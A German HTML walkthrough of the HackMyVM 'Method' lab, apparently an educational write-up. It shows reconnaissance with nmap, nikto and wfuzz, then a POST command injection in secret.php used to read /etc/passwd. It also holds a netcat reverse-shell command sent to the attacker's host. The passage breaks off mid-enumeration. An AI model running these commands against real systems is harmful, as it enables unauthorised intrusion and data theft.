@@ -1,0 +1,777 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Method - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Die CSS-Datei 'style.css' muss die Farben für 'Easy' (Grün/Lime) enthalten -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Method - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Farbe 'lime' durch CSS -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <!-- Segmentfarben 'lime' durch CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Hintergrundfarbe durch CSS -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">vi (oder text editor)</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ip</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">nc (Versuch)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (Command Injection)</a></li>
+                <li><a href="#privilege-escalation-prep">Privilege Escalation Preparation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Privilege Escalation via Sudo IP)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der erste Schritt ist die Identifizierung aktiver Hosts im lokalen Netzwerk mittels `arp-scan -l`.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.127	08:00:27:c3:5c:1c	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host mit der IP 192.168.2.127 wurde gefunden. Die MAC-Adresse deutet auf eine VirtualBox VM hin. Dies ist unser Zielsystem "Method".
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie einen Port-Scan auf 192.168.2.127 durch. Da spätere Befehle den Hostnamen `method.hmv` verwenden, fügen Sie einen Eintrag zur lokalen `/etc/hosts`-Datei hinzu (`192.168.2.127 method.hmv`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Netzwerküberwachung und Segmentierung können die Sichtbarkeit von Systemen einschränken.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein `nmap`-Scan wird durchgeführt, um offene Ports, Dienste und Versionen zu ermitteln. Die Optionen `-sS` (SYN Scan), `-sC` (Standard Skripte), `-T5` (schnelles Timing), `-A` (Aggressive Scan-Optionen) und `-O` (OS-Erkennung) werden verwendet, zusammen mit `-p-` für alle TCP-Ports.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -AO 192.168.2.127 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 22:52 CEST
+Nmap scan report for method (192.168.2.127)
+Host is up (0.00011s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey:
+|   3072 4b24341f411088b75a6a63d9f675266f (RSA)
+|   256 5246e72068c16f902fa6adee6d87e728 (ECDSA)
+|_  256 3fce97a91ef460f40e71e746582871f0 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Test Page for the Nginx HTTP Server on Fedora
+|_http-server-header: nginx/1.18.0
+MAC Address: 08:00:27:C3:5C:1C (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms method (192.168.2.127)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in [Scan Duration]
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan identifiziert zwei offene Ports:
+                *   **Port 22 (SSH):** OpenSSH 8.4p1 auf Debian. Erfordert Anmeldedaten.
+                *   **Port 80 (HTTP):** nginx 1.18.0, zeigt eine Standard-Testseite (Titel: "Test Page for the Nginx HTTP Server on Fedora", obwohl der Server später als Debian identifiziert wird).
+                Die Angriffsfläche scheint primär der Webserver zu sein, sekundär SSH, falls Zugangsdaten gefunden werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Enumerieren Sie den Webserver auf Port 80 gründlich mit Tools wie `nikto`, `gobuster` oder `wfuzz`. Suchen Sie nach Hinweisen auf dem Webserver oder in dessen Konfiguration, um Anmeldedaten für SSH zu finden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Halten Sie nginx und OpenSSH aktuell. Entfernen Sie die Standard-Testseite auf Port 80. Konfigurieren Sie SSH sicher (z.B. Key-basierte Authentifizierung, fail2ban).
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> `nikto` wird verwendet, um schnell nach bekannten Webserver-Schwachstellen und interessanten Dateien auf Port 80 zu suchen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.127</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.127
++ Target Hostname:    192.168.2.127
++ Target Port:        80
++ Start Time:         2023-04-17 22:52:38 (GMT2)
+---------------------------------------------------------------------------
++ Server: nginx/1.18.0
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /dump.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /1921682.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /192.168.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /backup.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /2.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /2.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /1921682.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /168.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /backup.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /192.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /127.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /site.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /site.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /192.168.2.127.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /database.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /archive.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
++ /sitemap.xml: This gives a nice listing of the site content.
++ /www/: This might be interesting.
++ /oekaki/: The PaintBBS Server may allow unauthorized access to the config files. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0202
++ /httpd.conf: Apache httpd.conf configuration file.
++ /httpd.conf.bak: Apache httpd.conf configuration file.
++ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
++ /wordpress/#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
++ 7947 requests: 0 error(s) and 169 item(s) reported on remote host
++ End Time:           2023-04-17 22:52:55 (GMT2) (17 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto meldet fehlende Sicherheitsheader (geringes Risiko). Es listet eine **sehr große Anzahl** potenziell interessanter Dateien auf, hauptsächlich Backup-Archive (`.tar.bz2`, `.lzma`, `.tgz`, `.tar`), Zertifikate (`.cer`, `.pem`) und andere Archivtypen (`.egg`, `.alz`, `.war`, `.jks`). Dies ist höchst ungewöhnlich und könnte auf eine Fehlkonfiguration, ein Honeypot oder einfach viel Rauschen hindeuten. Relevanter erscheinen `/sitemap.xml` und `/www/`. Die Funde `/httpd.conf` (Apache-Konfig) und `/wp-config.php` (WordPress) sind wahrscheinlich False Positives, da Nmap einen nginx-Server identifiziert hat.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die schiere Menge an Backup/Zertifikatsdateien ist verdächtig. Konzentrieren Sie sich zunächst auf die wahrscheinlicheren Ziele: Untersuchen Sie `/sitemap.xml` und `/www/`. Versuchen Sie, einige der spezifischeren Backup-Dateien herunterzuladen (z.B. `/dump.tar.bz2`, `/archive.tar`), wenn die anderen Pfade keine Ergebnisse liefern.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Entfernen Sie alle nicht benötigten Dateien und Verzeichnisse aus dem Web-Root. Insbesondere Backup-Dateien, Zertifikate und Konfigurationsdateien gehören niemals in öffentlich zugängliche Bereiche. Implementieren Sie die fehlenden Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`).
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt der von Nikto gefundenen `/sitemap.xml` wird mit `curl` abgerufen. Der Hostname `method.hmv` wird verwendet (nach Eintrag in `/etc/hosts`).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://method.hmv/sitemap.xml</span></div>
+                    <pre>
+<?xml version="1.0" encoding="UTF-8"?>
+<urlset xmlns="https://hackmyvm/sitemap/0.9">
+   <url>
+      <loc>https://hackmyvm.eu/machines/index.htm?vm=Brain</loc>
+      <lastmod>2020-02-13</lastmod>
+      <changefreq>monthly</changefreq>
+      <priority>0.8</priority>
+   </url>
+</urlset>
+                    </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die Sitemap enthält nur einen externen Link zu `hackmyvm.eu` und keine relevanten Informationen über die Struktur der Ziel-Webseite `method.hmv`. Sie ist für die weitere Enumeration nutzlos.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ignorieren Sie die Sitemap. Konzentrieren Sie sich auf andere Pfade oder versuchen Sie Parameter-Fuzzing.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Sitemaps aktuell sind und nur relevante interne URLs enthalten, oder entfernen Sie sie, wenn sie nicht benötigt werden.
+            </p>
+
+            <!-- Analyse des WordPress-Links überspringen, da wahrscheinlich irrelevant/False Positive -->
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird angezeigt, um die Zuordnung von `method.hmv` zur IP-Adresse 192.168.2.127 zu bestätigen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+127.0.0.1	localhost
+127.0.1.1	cyber
+
+# 192.168.2.107    AAAAAAAAAAAAA.hmv
+  192.168.2.127    method.hmv
+                     </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Zuordnung ist korrekt. Dies ermöglicht die Verwendung des Hostnamens in nachfolgenden Befehlen.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie konsistent den Hostnamen `method.hmv`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen erforderlich.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Zugriff auf die Hauptseite `http://method.hmv` über einen Browser oder `curl`. Der angezeigte Text ist der Inhalt der Standard-nginx-Seite unter Debian, die den Speicherort (`/var/www/html`) und die Konfigurationsdatei (`/etc/nginx/nginx.conf`) erwähnt.
+            </p>
+             <div class="code-block">
+                 <!-- Kein Terminal-Prompt, beschreibt Webseiteninhalt -->
+                 <pre>
+http://method.hmv
+
+Welcome to nginx on Debian!
+
+This page is used to test the proper operation of the nginx HTTP server
+after it has been installed. If you can read this page, it means that
+the web server installed at this site is working properly.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                  Website Administrator
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+This is the default index.html page that is distributed with nginx on
+Debian. It is located in /var/www/html.
+
+You should now put your content in a location of your choice and edit
+the root configuration directive in the nginx configuration file
+/etc/nginx/nginx.conf.
+                 </pre>
+             </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Bestätigt, dass es sich um die Standardseite handelt. Die Pfadangaben `/var/www/html` und `/etc/nginx/nginx.conf` sind nützliche Informationen für spätere Phasen, falls Datei-Lesezugriff erlangt wird.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da `gobuster` und `nikto` keine klaren Angriffsvektoren aufzeigten, versuchen Sie Parameter-Fuzzing auf bekannten oder potenziellen Skripten (wie `index.php`, auch wenn es nicht explizit gefunden wurde) oder suchen Sie nach versteckten Dateien mit ungewöhnlichen Namen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Ersetzen Sie die Standardseite durch eigenen Inhalt oder eine leere Seite. Beschränken Sie den Zugriff auf Konfigurationsdateien.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Versuch mit `wfuzz`, GET-Parameter auf der nicht existierenden Seite `index.php` zu finden. `FUZZ` wird als Parametername eingesetzt, und `/etc/passwd` als Wert (typisch für LFI-Tests). `--hh 3690` filtert Antworten mit der Größe 3690 Zeichen (vermutlich die Standard-Fehlerseite oder die nginx-Willkommensseite).
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://method.hmv/index.php?FUZZ=/etc/passwd --hh 3690</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://method.hmv/index.php?FUZZ=/etc/passwd
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+Total time: [Scan Duration]
+Processed Requests: 220560
+Filtered Requests: 220560
+Requests/sec.: [Scan Rate]
+                    </pre> <!-- Gekürzte Ausgabe -->
+                 </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan lieferte keine Ergebnisse. Es wurde kein Parameter gefunden, der eine abweichende Antwort (und damit eine potenzielle Schwachstelle wie LFI oder RCE) auf `index.php` auslöst.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da Standard-Enumeration und -Fuzzing bisher wenig ergeben haben, ist ein anderer Ansatz nötig. Der nächste Schritt im Log (`searchsploit`, Google-Suche) deutet auf die Suche nach bekannten Exploits für nginx 1.18.0 hin, was aber meist nur bei spezifischen Konfigurationen erfolgreich ist. Der **entscheidende Hinweis muss übersehen worden sein oder fehlt im Log**. Der plötzliche Sprung zu `secret.php` im nächsten Abschnitt legt nahe, dass dieser Pfad auf andere Weise entdeckt wurde (z.B. durch eine aggressivere Wortliste, Analyse von JavaScript-Dateien oder einen Hinweis außerhalb des Logs).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Halten Sie nginx aktuell. Überprüfen Sie die Konfiguration auf Sicherheit.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Suche nach bekannten öffentlichen Exploits für nginx mit `searchsploit` und Google.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">searchsploit nginx</span></div>
+                    <pre>
+------------------------------------------------------------ ---------------------------------
+ Exploit Title                                              |  Path
+------------------------------------------------------------ ---------------------------------
+Nginx (Debian Based Distros + Gentoo) - 'logrotate' Local P | linux/local/40768.sh
+Nginx 0.6.36 - Directory Traversal                          | multiple/remote/12804.txt
+Nginx 0.6.38 - Heap Corruption                              | linux/local/14830.py
+Nginx 0.6.x - Arbitrary Code Execution NullByte Injection   | multiple/webapps/24967.txt
+Nginx 0.7.0 < 0.7.61 / 0.6.0 < 0.6.38 / 0.5.0 < 0.5.37 / 0. | linux/dos/9901.txt
+Nginx 0.7.61 - WebDAV Directory Traversal                   | multiple/remote/9829.txt
+Nginx 0.7.64 - Terminal Escape Sequence in Logs Command Inj | multiple/remote/33490.txt
+Nginx 0.7.65/0.8.39 (dev) - Source Disclosure / Download    | windows/remote/13822.txt
+Nginx 0.8.36 - Source Disclosure / Denial of Service        | windows/remote/13818.txt
+Nginx 1.1.17 - URI Processing SecURIty Bypass               | multiple/remote/38846.txt
+Nginx 1.20.0 - Denial of Service (DOS)                      | multiple/remote/50973.py
+Nginx 1.3.9 < 1.4.0 - Chuncked Encoding Stack Buffer Overfl | linux/remote/25775.rb
+Nginx 1.3.9 < 1.4.0 - Denial of Service (PoC)               | linux/dos/25499.py
+Nginx 1.3.9/1.4.0 (x86) - Brute Force                       | linux_x86/remote/26737.pl
+Nginx 1.4.0 (Generic Linux x64) - Remote Overflow           | linux_x86-64/remote/32277.txt
+PHP-FPM + Nginx - Remote Code Execution                     | php/webapps/47553.md
+------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+                    </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <!-- Kein Terminal-Prompt, beschreibt Google-Suche -->
+                 <pre>
+https://www.google.de/search?q=nginx+1.18.0+exploit+github&sxsrf=APwXEdcIoc-JGDcCPwK5ILBN_KqchT8XQA%3A1681765643829&ei=C7U9ZPX5MYW8xc8PwLCRoAY&oq=remote+exploid+nginx%2F1.18.0&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQARgBMgUIABCiBDIFCAAQogQ6CggAEEcQ1gQQsANKBAhBGABQjhZYjhZgsTZoAnABeACAAYABiAGAAZIBAzAuMZgBAKABAqABAcgBCMABAQ&sclient=gws-wiz-serp
+
+nginx 1.18.0 exploit github
+                 </pre>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Suche nach öffentlichen Exploits für nginx 1.18.0 liefert keine direkten, einfach anwendbaren Ergebnisse. Viele Exploits betreffen ältere Versionen oder erfordern spezielle Konfigurationen (wie WebDAV oder PHP-FPM).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Ausnutzung eines öffentlichen Exploits für den nginx-Server selbst ist unwahrscheinlich. Der Fokus muss auf der Webanwendung liegen, die auf nginx läuft (auch wenn bisher nur die Standardseite sichtbar war). Es muss eine versteckte Datei oder ein Verzeichnis geben. *Der nächste Schritt im Log springt zu `secret.php`, was diese Annahme stützt.*
+                <br>
+                <strong>Empfehlung (Admin):</strong> Patching ist wichtig, aber hier scheint die Schwachstelle eher in der Anwendung als im Webserver selbst zu liegen.
+            </p>
+
+             <!-- Zugriff auf /index.htm übersprungen, da nicht relevant -->
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, auf `secret.php` zuzugreifen, diesmal mit `curl -I`, um nur die Header abzurufen. Der Pfad `secret.php` muss zwischenzeitlich gefunden worden sein (z.B. durch eine andere Wortliste, einen Hinweis, oder er war doch in der Nikto-Ausgabe und wurde übersehen - Nikto hat `/www/` gefunden, vielleicht liegt es dort?).
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://method.hmv/secret.php -I</span></div>
+                    <pre>
+HTTP/1.1 302 Found
+Server: nginx/1.18.0
+Date: Mon, 17 Apr 2023 21:23:22 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+Location: https://images-na.ssl-images-amazon.com/images/I/31YDo0l4ZrL._SX331_BO1,204,203,200_.jpg
+                    </pre>
+                 </div>
+             </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Server antwortet mit einem 302 Redirect auf eine externe Bild-URL. Dies bestätigt die Existenz von `secret.php`, aber ein einfacher GET-Request ohne Parameter führt nicht zum Ziel. Das Skript erwartet wahrscheinlich Parameter oder eine andere HTTP-Methode.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Testen Sie `secret.php` mit verschiedenen Parametern (z.B. `cmd`, `file`, `page`, oder Namen, die thematisch passen) und verschiedenen HTTP-Methoden (POST).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Untersuchen Sie `secret.php`. Wenn es nicht benötigt wird, entfernen Sie es. Wenn es benötigt wird, stellen Sie sicher, dass es sicher ist und nicht auf externe Seiten umleitet, es sei denn, dies ist beabsichtigt.
+            </p>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (Command Injection)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, `secret.php` mit einem GET-Parameter `HackMyVM=id` aufzurufen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://method.hmv/secret.php?HackMyVM=id</span></div>
+                    <pre>
+Now the main part what it is loooooool
+Try other method
+                     </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die Antwort "Try other method" bestätigt, dass `HackMyVM` der richtige Parametername ist, aber die GET-Methode nicht zur Ausführung führt.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Senden Sie eine POST-Anfrage mit dem Parameter `HackMyVM=id`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Der Code in `secret.php` ist unsicher und sollte dringend korrigiert werden.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Eine POST-Anfrage wird mit `curl -X POST` an `secret.php` gesendet. Der Parameter `HackMyVM` wird im Body (`-d`) mit dem Wert `id` übergeben. Der `Content-Type` Header wird korrekt gesetzt.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X POST 'http://method.hmv/secret.php' -d 'HackMyVM=id' -H 'Content-Type: application/x-www-form-urlencoded'</span></div>
+                     <pre>
+You Found ME : - ( uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                     </pre>
+                 </div>
+             </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Command Injection erfolgreich!** Die POST-Anfrage führt den `id`-Befehl aus und gibt das Ergebnis zurück. Der Befehl wird als `www-data` ausgeführt. Initial Access ist erreicht.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie diese Schwachstelle, um das System weiter zu enumerieren und Anmeldedaten für SSH zu finden oder eine Reverse Shell zu etablieren.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Beheben Sie die RCE-Schwachstelle in `secret.php` durch Validierung/Sanitisierung der Eingabe oder durch Verwendung sicherer Funktionen anstelle von `system()`.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Versuch, eine Reverse Shell mit `nc -e` über die POST-Command-Injection zu starten.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X POST 'http://method.hmv/secret.php' -d 'HackMyVM=nc -e /bin/bash 192.168.2.129 4444' -H 'Content-Type: application/x-www-form-urlencoded'</span></div>
+                     <pre>
+You Found ME
+                     </pre>
+                 </div>
+             </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Antwort enthält nicht die erwartete Shell-Ausgabe oder eine Fehlermeldung. Der Befehl `nc -e` ist oft auf modernen Systemen nicht verfügbar oder die Webserver-Umgebung verhindert die direkte Socket-Interaktion auf diese Weise. Dieser Reverse-Shell-Versuch ist wahrscheinlich fehlgeschlagen.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie andere Reverse-Shell-Methoden (Bash TCP, Python, Perl, PHP). Wenn keine direkte Shell möglich ist, fahren Sie mit der Enumeration über die POST-Requests fort.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Entfernen Sie unnötige Tools wie Netcat (`nc`) vom Server oder beschränken Sie deren Ausführung.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Weitere Enumeration über die POST-RCE-Schwachstelle: Auslesen von `/etc/passwd`, Filtern nach Shell-Benutzern, Auflisten von Home-Verzeichnissen und des Inhalts von `/home/prakasaka`, Lesen der User-Flag.
+            </p>
+             <!-- Mehrere curl-Befehle zusammengefasst -->
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X POST 'http://method.hmv/secret.php' -d 'HackMyVM=cat /etc/passwd' -H 'Content-Type: application/x-www-form-urlencoded'</span></div>
+                     <pre>
+You Found ME : - ( root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+prakasaka:x:1000:1000:prakasaka,,,:/home/prakasaka:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+                     </pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X POST 'http://method.hmv/secret.php' -d 'HackMyVM=cat /etc/passwd | grep bash+' -H 'Content-Type: application/x-www-form-urlencoded'</span></div>
+                    <pre>
+You Found ME : - ( root:x:0:0:root:/root:/bin/bash
+prakasaka:x:1000:1000:prakasaka,,,:/home/prakasaka:/bin/bash
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X POST 'http://method.hmv/secret.php' -d 'HackMyVM=ls /home' -H 'Content-Type: application/x-www-form-urlencoded'</span></div>
+                     <pre>
+You Found ME : - ( prakasaka
+                     </pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
